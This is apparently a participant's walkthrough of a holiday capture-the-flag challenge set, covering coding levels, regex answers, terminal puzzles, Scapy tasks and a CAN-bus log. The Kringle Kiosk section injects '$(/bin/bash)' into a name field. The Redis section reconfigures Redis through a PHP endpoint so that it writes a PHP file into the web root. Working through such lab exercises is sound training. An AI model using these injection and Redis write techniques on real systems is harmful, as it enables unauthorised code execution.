		elf.tell_munch(o)
	  }
	}
	elf.moveUp(2)
Level 7 (Bonus):
	function do_lever(l) {
		elf.pull_lever(l)
	}
	for (var steps = 1; steps < 8; steps = steps + 4) {
	  elf.moveDown(steps)
	  do_lever(steps - 1)
	  elf.moveLeft(steps + 1)
	  do_lever(steps)
	  elf.moveUp(steps + 2)
	  do_lever(steps + 1)
	  elf.moveRight(steps + 3)
	  do_lever(steps + 2)
	  lever = lever + 4
	}
	elf.moveUp(2)
	elf.moveLeft(4)
	elf.tell_munch(function test(a) {
	  var total = 0
	  for (i in a)
		for (j in a[i])(typeof a[i][j] === 'number') ? total += a[i][j] : total;

	  return total
	})
	elf.moveUp(2)
Level 8 (Bonus):
	var sums = [0, 0, 0, 0, 0, 0, 0]
	for (var i = 0; i < 6; i++) {
	  sums[i + 1] = sums[i] + elf.get_lever(i);
	}
	var steps = 1
	for (var i = 1; i < 7; i++) {
	  elf.moveRight(steps)
	  elf.pull_lever(sums[i])
	  elf.moveUp(2)
	  elf.moveLeft(steps + 2)
	  elf.pull_lever(sums[i + 1])
	  elf.moveUp(2)
	  steps += 4
	  i += 1
	}
	elf.tell_munch(function test(obs) {
	  for (o in obs) {
		for (i in obs[o]) {
		  if (obs[o][i] == "lollipop") {
			return i
		  }
		}
	  }
	})
	elf.moveRight(12)
```
All done!


## 33.6kbps
oooh Dial up!

756-8347


BAAdeeBRRRR
aaah
WEWEWWRWRRWRR
beDURRdunditty
SCHHRRHHRTHRTR

"You're lights have been updated"

## Snowball Fight

Must come back to this

## Sort-o-matic

Regular expressions...NOOOOOOOOOOOOOOOOOOOOOOOOOOOO

1. Create a Regex That Matches All Digits
Create a regular expression that will only match any string containing at least one digit.

[0-9]

2. Create a Regex That Matches 3 or More Alpha Characters Ignoring Case
Create a regular expression that will only match only alpha characters A-Z of at least 3 characters in length or greater while ignoring case.

[a-zA-Z]{3}

3. Create a Regex That Matches Two Consecutive Lowercase a-z or numeric characters.
Create a regular expression that will only match at least two consecutive lowercase a-z or numeric characters.

[a-z0-9]{2,}

4. Any two characters that are not uppercase A-L or 1-5
Create a regular expression that will only match any two characters that are NOT uppercase a through L and NOT numbers 1 through 5.

[^A-L1-5]{2}

5. Create a Regex To Match a String of 3 Characters in Length or More Composed of ONLY Digits
Create a regular expression that only matches if the entire string is composed of entirely digits and is at least 3 characters in length.

^\d{3,}$

6. Create A Regex To Match Multiple Hour:Minute:Second Time Formats Only

^(([0-1]?[0-9]|2[0-3]):[0-5][0-9]:[0-5][0-9])+$

7. Create A Regular Expression That Matches The MAC Address Format Only While Ignoring Case 

^\b[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}\b$

8. Create A Regex That Matches Multiple Day, Month, and Year Date Formats Only

^\b[0-2][0-9][\/.-][01][0-9][\/.-][0-9]{4}\b$

## Terminals

### Unescape tmux 
"""
Can you help me?

I was playing with my birdie (she's a Green Cheek!) in something called tmux,
then I did something and it disappeared!

Can you help me find her? We were so attached!!
"""

List tmux sessions with:
tmux list-sessions

This shows an active session with an ID of 2

Attach to it with:
tmux attach -t 0

Result: 
"""
You found her! Thank you!!!
#####hhc:{"hash": "f51efaa0c665245b63e8339b5aa9e6dc6187ae7b0b2d69d8a5d39ee775d3b93c", "resourceId": "4385acaa-8aa6-4b37-b505-c3c2b14dec23"}#####
"""


### Kringle Kiosk

Option 4 allows us to enter a name. Cowsay is presumably used to print our name. We can call /bin/bash here by entering the name $(/bin/bash). Exiting our shell will cuase the following to be displayed:

 _________________________________________
/ #####hhc:{"hash":                       \
| "076f041b7617550859903cb0baf71a3bc2d848 |
| b66f93597ab9aeed85e29a2205",            |
| "resourceId":                           |
| "5752ddeb-91a0-46db-8500-157056ef73e3"} |
| ##### ___ _ / __| _ _ __ __ ___ ___ ___ |
| | | \__ \ | +| | / _| / _| / -_) (_-<   |
| (_-< |_| |___/ \_,_| \__|_ \__|_ \___|  |
| /__/_ /__/_ _(_)_                       |
| _|"""""|_|"""""|_|"""""|_|"""""|_|""""" |
| |_|"""""|_|"""""|_| """ |               |
| "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0- |
| '"`-0-0-'"`-0-0-'"`-0-0-' Type 'exit'   |
| to return to the menu. welcome.sh       |
| welcome.sh /home/shinny                 |
| #####hhc:{"hash":                       |
| "076f041b7617550859903cb0baf71a3bc2d848 |
| b66f93597ab9aeed85e29a2205",            |
| "resourceId":                           |
| "5752ddeb-91a0-46db-8500-157056ef73e3"} |
| ##### ___ _ / __| _ _ __ __ ___ ___ ___ |
| | | \__ \ | +| | / _| / _| / -_) (_-<   |
| (_-< |_| |___/ \_,_| \__|_ \__|_ \___|  |
| /__/_ /__/_ _(_)_                       |
| _|"""""|_|"""""|_|"""""|_|"""""|_|""""" |
| |_|"""""|_|"""""|_| """ |               |
| "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0- |
| '"`-0-0-'"`-0-0-'"`-0-0-' Type 'exit'   |
| to return to the menu. welcome.sh       |
\ shinny elf shinny                       /
 -----------------------------------------
  \
   \   \_\_    _/_/
    \      \__/
           (oo)\_______
           (__)\       )\/\
               ||----w |
               ||     ||
			   

### Redis Bug Hunt


Useful information here: https://book.hacktricks.xyz/pentesting/6379-pentesting-redis


curl http://localhost/maintenance.php?cmd=config,get,*

dbfilename
dump.rdb
requirepass
R3disp@ss

redis-cli --raw -a R3disp@ss config get *

Success using the following:

curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html

curl http://localhost/maintenance.php?cmd=config,set,dbfilename,rawr.php

curl http://localhost/maintenance.php?cmd=set,test,%22%3C%3Fphp+echo%28file_get_contents%28%27index.php%27%29%29%3B+%3F%3E%22


curl http://localhost/maintenance.php?cmd=save

curl --output - 127.0.0.1/rawr.php


### Speaker Unpreperdness room

For the door binary use: strings door
After looking through the output we find:
Be sure to finish the challenge in prod: And don't forget, the password is "Op3nTheD00r"

Using Op3nTheD00r will open the door

For the lights binary, it points us towards the lights.conf file

Viewing the file with cat reveals:
password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
name: elf-technician

The password looks like a hash, and trying it doesn't work. 

Bushy Evergreen gives us a great hint here. The program will decrypt any value in the file that's matched with a key. So if we replace the name with the encrypted password then it will give us back the unencrpyted password: Computer-TurnLightsOn
Entering that as the password will turn the lights on!

For the vending machine binary the conf file has the following
{
  "name": "elf-maintenance",
  "password": "LVEdQPpBwr"
}

Bushy Evergreen suggested that this password is the product of a simple cipher. 

If we rename the conf file then the binary will go into a conf creation mode where wqe can define the name and password ourselves.

The key seems to be 8 characters long. It repeats after 8 characters.

For example: 
AAAAAAAAAA -> XiGRehmwXi
aaaaaaaaaa -> 9Vbtacpg9V

Could try to work out the cipher but not sure what the cipher alphabet is.

Wrote a script to iterate through the alphabet and get the password for aaaaaaaa, bbbbbbbb, cccccccc, etc. To get the result for each position. Matches position result with the password we need to crask and got the following:

L V E d Q P p B w r
C a n d y C a n e 1


### Scapy Prepper

Type "yes" to begin. yes
╔════════════════════════════════════════════════════════════════╗
║ HELP MENU:                                                     ║
╠════════════════════════════════════════════════════════════════╣
║ 'help()' prints the present packet scapy help.                 ║
║ 'help_menu()' prints the present packet scapy help.            ║
║ 'task.get()' prints the current task to be solved.             ║
║ 'task.task()' prints the current task to be solved.            ║
║ 'task.help()' prints help on how to complete your task         ║
║ 'task.submit(answer)' submit an answer to the current task     ║
║ 'task.answered()' print through all successfully answered.     ║
╚════════════════════════════════════════════════════════════════╝
>>> task.get()
Welcome to the "Present Packet Prepper" interface! The North Pole could use your help preparing present packets for shipment.
Start by running the task.submit() function passing in a string argument of 'start'.
Type task.help() for help on this question. 

Part 1 ===
Start by called 

task.submit("start")

Part 2 ===

Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.

task.submit(send)

Part 3 === 

Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.

task.submit(sniff)

Part 4 ===

Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named "pkt":
1. pkt = sr1(IP(dst="127.0.0.1")/TCP(dport=20))
2. pkt = sniff(IP(dst="127.0.0.1")/TCP(dport=20))
3. pkt = sendp(IP(dst="127.0.0.1")/TCP(dport=20))

task.submit(1)

Part 5 ===

Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets

task.submit(rdpcap)

Part 6 ===

The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:
1. UDP_PACKETS.print()
2. UDP_PACKETS.show()
3. UDP_PACKETS.list()

task.submit(2)

Part 7 ===

Submit only the first packet found in UDP_PACKETS.

task.submit(UDP_PACKETS[0])

Part 8 ===

Submit only the entire TCP layer of the second packet in TCP_PACKETS

task.submit(TCP_PACKETS[1][TCP])

Part 9 ===

Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet

pkt = UDP_PACKETS[0]
pkt[IP].src = "127.0.0.1"

Part 10 ===

Submit the password "task.submit('elf_password')" of the user alabaster as found in the packet list TCP_PACKETS.

>>> for pkt in TCP_PACKETS:
...     try:
...       print(pkt[TCP].load)
...     except:
...       pass
b'220 North Pole FTP Server\r\n'
b'USER alabaster\r'
b'331 Password required for alabaster.\r'
b'PASS echo\r\n'
b'230 User alabaster logged in.\r'

task.submit("echo")

Part 11 ===

The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.

task.submit(ICMP_PACKETS[1][ICMP].chksum)

Part 12 === 

Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named "pkt"
1. pkt = Ether(src='127.0.0.1')/ICMP(type="echo-request")
2. pkt = IP(src='127.0.0.1')/ICMP(type="echo-reply")
3. pkt = IP(dst='127.0.0.1')/ICMP(type="echo-request")

task.submit(3)

Part 13 ===

Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified)

task.submit(IP(dst="127.127.127.127")/UDP(dport=5000))

Part 14 ===

Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of "elveslove.santa". (all other packet attributes can be unspecified)

pkt = IP(dst="127.2.3.4")/UDP(dport=53)/DNSQR(qname="elveslove.santa")


Part 15 ===

The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.

>>> pkt = ARP_PACKETS[1]

>>> pkt.show()
###[ Ethernet ]### 
  dst       = 00:16:ce:6e:8b:24
  src       = 00:13:46:0b:22:ba
  type      = ARP
###[ ARP ]### 
     hwtype    = 0x1
     ptype     = IPv4
     hwlen     = 6
     plen      = 4
     op        = None
     hwsrc     = ff:ff:ff:ff:ff:ff
     psrc      = 192.168.0.1
     hwdst     = ff:ff:ff:ff:ff:ff
     pdst      = 192.168.0.114
###[ Padding ]### 
        load      = '\xc0\xa8\x00r'
		
You have to submit the ARP_PACKETS list...Should have read that before submitting pkt!

>>> ARP_PACKETS[1].op = 2

>>> ARP_PACKETS[1].hwsrc = "00:13:46:0b:22:ba"

>>> ARP_PACKETS[1].hwdst = "00:16:ce:6e:8b:24"

>>> task.submit(ARP_PACKETS)
Great, you prepared all the present packets!

Congratulations, all pretty present packets properly prepared for processing!


### CAN-Bus Investigation

Took the CAN-Bus log and storing it in a file.

I figured that the IDs starting with 244 were all realated to the engine revving, so I wrote the following Python snippet to filter these out.

>>> f = open("can_log.txt", 'r')
>>> for l in f:
...   if("vcan0 244" not in l):
...     print(l)

This filtered the log down to messages starting with 188 and 19B
There were 3 messages starting with 19B, so these must be our LOCK, UNLOCK, and LOCK.

The follwoing log is the UNLOCK (1608926671.122520) vcan0 19B#00000F000000

Submitting 122520 will solve the challenge.

